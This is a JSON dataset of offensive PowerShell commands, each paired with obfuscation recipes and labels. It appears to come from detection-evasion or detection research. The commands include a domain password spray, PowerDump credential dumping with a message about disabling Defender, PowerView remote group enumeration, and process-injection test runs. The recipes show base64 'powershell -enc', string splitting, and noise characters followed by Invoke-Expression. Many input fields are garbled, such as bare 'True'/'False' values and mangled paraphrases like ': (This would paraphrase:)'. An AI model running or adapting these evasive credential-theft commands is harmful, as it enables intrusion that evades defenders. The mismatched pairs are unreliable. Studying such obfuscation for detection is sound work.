    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Perform a domain password spray attack using a list of usernames and passwords, and save the results to a file.",
    "origin_cmd": "Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Write a message to the console, import a module, and invoke a command related to PowerDump.",
    "origin_cmd": "Write-Host \"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\" -fore green ; Import-Module \"$Env:Temp\\PowerDump.ps1\" ; Invoke-PowerDump"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell .",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging in PowerShell by default .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell .",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging in PowerShell by default .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell .",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging in PowerShell by default .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell .",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging in PowerShell by default .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Enable script block logging and command health event logging in PowerShell.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Enable script block logging and command health event logging in PowerShell.",
    "origin_cmd": "$ScriptBlockLogging = $true; $LogCommandHealthEvent = $true; $LogScriptBlockInvocation = $true;"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Paraphrase: Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Paraphrase: Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Paraphrase: Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Paraphrase: Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Import the PowerView module and retrieve local group members on a specified remote host.",
    "origin_cmd": "Import-Module .\\powerview.ps1; ; Get-NetLocalGroupMember -ComputerName ${remote.host.fqdn}"
  },
  {
    "input": "Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Paraphrase: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "parody: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "cscript: Execute a VBScript using cscript and redirect the output to a text file .",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Paraphrase: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "parody: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "cscript: Execute a VBScript using cscript and redirect the output to a text file .",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Paraphrase: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "parody: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "cscript: Execute a VBScript using cscript and redirect the output to a text file .",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Paraphrase: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "parody: Execute a VBScript using cscript and redirect the output to a text file.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "cscript: Execute a VBScript using cscript and redirect the output to a text file .",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a VBScript using cscript and redirect the output to a text file.",
    "origin_cmd": "cscript ${VBscript} > $env:TEMP\\T1059.005_tec.out.txt"
  },
  {
    "input": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ":: In: Put Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": \"InjectView.exe\" This: \"Start Notepad and another process (InjectView.exe) in the Atomics folder\" .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": (This would): (This would paraphrase:) Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ":: In: Put Notepad and another process (InjectView.exe) in the Atomics folder.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": \"InjectView.exe\" This: \"Start Notepad and another process (InjectView.exe) in the Atomics folder\" .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Start Notepad and another process (InjectView.exe) in the Atomics folder.",
    "origin_cmd": "$notepad = Start-Process notepad -passthru ; Start-Process $PathToAtomicsFolder\\T1055\\bin\\x64\\InjectView.exe"
  },
  {
    "input": ": (This would): (This would paraphrase:) Start Notepad and another process (InjectView.exe) in the Atomics folder.",
